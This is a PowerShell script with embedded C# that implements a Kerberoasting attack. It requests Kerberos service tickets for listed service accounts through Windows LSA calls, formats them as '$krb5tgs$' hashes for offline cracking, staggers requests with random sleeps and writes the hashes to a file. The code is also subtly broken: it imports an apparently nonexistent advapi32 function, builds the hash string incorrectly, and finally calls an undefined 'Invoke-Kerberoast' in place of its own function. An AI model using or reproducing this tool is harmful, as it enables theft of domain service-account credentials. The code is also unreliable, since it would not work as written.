$Code = @"
using System;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.ComponentModel;

public class Israel
{
    [StructLayout(LayoutKind.Sequential)]
    public struct LUID
    {
        public uint LowPart;
        public int HighPart;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct UNICODE_STRING
    {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_RETRIEVE_TKT_REQUEST
    {
        public KERB_PROTOCOL_MESSAGE_TYPE MessageType;
        public LUID LogonId;
        public KERB_TICKET_FLAGS TicketFlags;
        public int CacheOptions;
        public int EncryptionType;
        public UNICODE_STRING TargetName;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_RETRIEVE_TKT_RESPONSE
    {
        public KERB_EXTERNAL_TICKET Ticket;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_EXTERNAL_TICKET
    {
        public IntPtr ServiceName;
        public IntPtr TargetName;
        public IntPtr ClientName;
        public UNICODE_STRING DomainName;
        public UNICODE_STRING TargetDomainName;
        public UNICODE_STRING AltTargetDomainName;
        public KERB_CRYPTO_KEY SessionKey;
        public uint TicketFlags;
        public uint Flags;
        public long KeyExpirationTime;
        public long StartTime;
        public long EndTime;
        public long RenewUntil;
        public long TimeSkew;
        public int EncodedTicketSize;
        public IntPtr EncodedTicket;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_CRYPTO_KEY
    {
        public int KeyType;
        public int Length;
        public IntPtr Value;
    }

    public enum KERB_PROTOCOL_MESSAGE_TYPE
    {
        KerbRetrieveTicketMessage = 11
    }

    [Flags]
    public enum KERB_TICKET_FLAGS
    {
        Forwardable = 0x40000000,
        Forwarded = 0x20000000,
        Renewable = 0x00000010
    }

    [DllImport("secur32.dll", SetLastError = true)]
    public static extern int LsaConnectUntrusted(out IntPtr lsaHandle);

    [DllImport("secur32.dll", SetLastError = true)]
    public static extern int LsaLookupAuthenticationPackage(IntPtr lsaHandle, 
        ref UNICODE_STRING packageName, out uint authenticationPackage);

    [DllImport("secur32.dll", SetLastError = true)]
    public static extern int LsaCallAuthenticationPackage(IntPtr lsaHandle, 
        uint authenticationPackage, IntPtr submitBuffer, int submitBufferLength,
        out IntPtr returnBuffer, out int returnBufferLength, out int protocolStatus);

    [DllImport("secur32.dll", SetLastError = true)]
    public static extern int LsaFreeReturnBuffer(IntPtr buffer);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool GetTicketEx(
        uint dwFlags,
        uint dwOptions,
        string pTarget,
        IntPtr pvid,
        IntPtr phTicket);

    public static string RequestAndExtractTGS(string spn)
    {
        try
        {
            IntPtr lsaHandle;
            int result = LsaConnectUntrusted(out lsaHandle);
            if (result != 0)
                throw new Win32Exception(result);

            UNICODE_STRING packageName = new UNICODE_STRING();
            packageName.Buffer = Marshal.StringToHGlobalUni("Kerberos");
            packageName.Length = (ushort)(("Kerberos".Length) * 2);
            packageName.MaximumLength = (ushort)(("Kerberos".Length) * 2);

            uint authPackage;
            result = LsaLookupAuthenticationPackage(lsaHandle, ref packageName, out authPackage);
            Marshal.FreeHGlobal(packageName.Buffer);

            if (result != 0)
                throw new Win32Exception(result);

            // Prepare request
            KERB_RETRIEVE_TKT_REQUEST request = new KERB_RETRIEVE_TKT_REQUEST();
            request.MessageType = KERB_PROTOCOL_MESSAGE_TYPE.KerbRetrieveTicketMessage;
            request.TicketFlags = KERB_TICKET_FLAGS.Forwardable;
            request.CacheOptions = 0x8; // KERB_RETRIEVE_TICKET_AS_KERB_CRED

            UNICODE_STRING targetName = new UNICODE_STRING();
            targetName.Buffer = Marshal.StringToHGlobalUni(spn);
            targetName.Length = (ushort)((spn.Length) * 2);
            targetName.MaximumLength = (ushort)((spn.Length) * 2);
            request.TargetName = targetName;

            IntPtr requestPtr = Marshal.AllocHGlobal(Marshal.SizeOf(request));
            Marshal.StructureToPtr(request, requestPtr, false);

            IntPtr returnBuffer;
            int returnBufferLength;
            int protocolStatus;

            result = LsaCallAuthenticationPackage(lsaHandle, authPackage, 
                requestPtr, Marshal.SizeOf(request), 
                out returnBuffer, out returnBufferLength, out protocolStatus);

            Marshal.FreeHGlobal(targetName.Buffer);
            Marshal.FreeHGlobal(requestPtr);

            if (result == 0 && protocolStatus == 0)
            {
                KERB_RETRIEVE_TKT_RESPONSE response = (KERB_RETRIEVE_TKT_RESPONSE)
                    Marshal.PtrToStructure(returnBuffer, typeof(KERB_RETRIEVE_TKT_RESPONSE));
                
                byte[] ticketData = new byte[response.Ticket.EncodedTicketSize];
                Marshal.Copy(response.Ticket.EncodedTicket, ticketData, 0, ticketData.Length);
                
                LsaFreeReturnBuffer(returnBuffer);
                
                string ticketBase64 = Convert.ToBase64String(ticketData);
                return "\$krb5tgs\$23\$" + spn + "\$" + ticketBase64;
            }
            else
            {
                throw new Win32Exception(protocolStatus);
            }
        }
        catch (Exception ex)
        {
            return "Error: " + ex.Message;
        }
    }

    // Simple TGS request method
    public static void RequestTGS(string spn)
    {
        try
        {
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                // This forces Kerberos to request a TGS
                System.IdentityModel.Tokens.KerberosRequestorSecurityToken token = 
                    new System.IdentityModel.Tokens.KerberosRequestorSecurityToken(spn);
                
                Console.WriteLine("TGS requested for: " + spn);
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("Failed to request TGS: " + ex.Message);
        }
    }
}
"@

# Compila o código C#
Add-Type -TypeDefinition $Code -ReferencedAssemblies "System.IdentityModel"

# Função PowerShell para usar a classe
function Israel2 {
    param(
        [string[]]$SPNs,
        [string]$OutputFile = "israel2_hashes.txt"
    )
    
    $results = @()
    
    foreach ($spn in $SPNs) {
        Write-Host "[*] Targeting SPN: $spn" -ForegroundColor Yellow
        
        # Primeiro solicita o TGS
        [Israel]::RequestTGS($spn)
        Start-Sleep -Seconds 3
        
        # Tenta extrair o hash
        Write-Host "[*] Attempting to extract TGS hash..." -ForegroundColor Yellow
        $hash = [Israel]::RequestAndExtractTGS($spn)
        
        if ($hash -like "*\$krb5tgs*") {
            Write-Host "[+] SUCCESS: Hash extracted for $spn" -ForegroundColor Green
            $results += $hash
        } else {
            Write-Host "[-] FAILED: $hash" -ForegroundColor Red
        }
        
        Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 10)
    }
    
    # Salva os hashes
    if ($results.Count -gt 0) {
        $results | Out-File -FilePath $OutputFile -Encoding UTF8
        Write-Host "[+] Hashes saved to: $OutputFile" -ForegroundColor Green
        Write-Host "[+] Total hashes: $($results.Count)" -ForegroundColor Green
    }
}

# Uso:
$spns = @(
    "MSSQLSvc/sql01.domain.com:1433",
    "HTTP/web01.domain.com",
    "cifs/fileserver.domain.com"
)

Invoke-Kerberoast -SPNs $spns
